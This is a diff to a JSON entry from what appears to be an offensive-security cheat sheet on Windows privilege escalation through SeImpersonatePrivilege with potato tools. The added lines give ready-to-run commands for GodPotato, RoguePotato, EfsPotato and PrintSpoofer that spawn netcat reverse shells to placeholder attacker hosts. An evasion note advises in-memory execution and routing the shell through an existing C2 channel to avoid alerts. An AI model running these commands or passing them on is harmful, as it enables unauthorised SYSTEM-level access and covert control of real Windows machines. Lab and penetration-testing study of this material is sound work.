@@ -98,6 +98,35 @@
       "HTB M26",
       "MITRE T1134.001",
       "MITRE T1068"
-    ]
-  }
+    ],
+    "evasion": "Pick the potato that matches the OS (GodPotato for 2019/2022) to avoid crashes and alerts; run it in-memory; the SeImpersonate abuse itself is quiet — the noisy part is the spawned shell, so route it through an existing C2 channel."
+  },
+  "variations": [
+    {
+      "label": "GodPotato (modern, works 2019/2022)",
+      "command": "GodPotato.exe -cmd \"cmd /c whoami\""
+    },
+    {
+      "label": "RoguePotato",
+      "command": "RoguePotato.exe -r <attacker_ip> -e \"C:\\tools\\nc.exe <lhost> <lport> -e cmd\" -l 9999"
+    },
+    {
+      "label": "EfsPotato",
+      "command": "EfsPotato.exe \"cmd /c whoami\""
+    }
+  ],
+  "steps": [
+    {
+      "label": "Confirm SeImpersonatePrivilege",
+      "command": "whoami /priv | findstr SeImpersonate"
+    },
+    {
+      "label": "Trigger the potato to get SYSTEM",
+      "command": "PrintSpoofer.exe -c \"c:\\tools\\nc.exe <lhost> <lport> -e cmd\""
+    },
+    {
+      "label": "Catch the SYSTEM shell",
+      "command": "# nc -lvnp <lport> on attacker"
+    }
+  ]
 }
